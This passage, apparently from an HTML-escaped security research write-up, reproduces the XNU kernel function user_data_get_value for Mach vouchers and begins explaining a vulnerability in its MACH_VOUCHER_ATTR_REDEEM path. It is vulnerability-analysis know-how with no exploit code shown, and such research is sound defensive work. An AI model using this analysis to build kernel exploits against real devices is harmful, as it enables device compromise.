class="BGLtzooHlW-c3"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; prev_value_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_flags&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_manager &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* never an out voucher */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IPC_VOUCHER_NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_flags &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_NONE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;switch&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;case&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;prev_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;case&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;USER_DATA_MAX_DATA &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* empty is the default */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;default&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* every other command is unknown */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s look at the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case, which is the command we put in our single sub-recipe. (The vulnerability is in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code above but we need a lot more background before we get to that.) In the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the input arbitrary byte buffer is passed to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;, then that return value is returned as the value of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;out_value&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 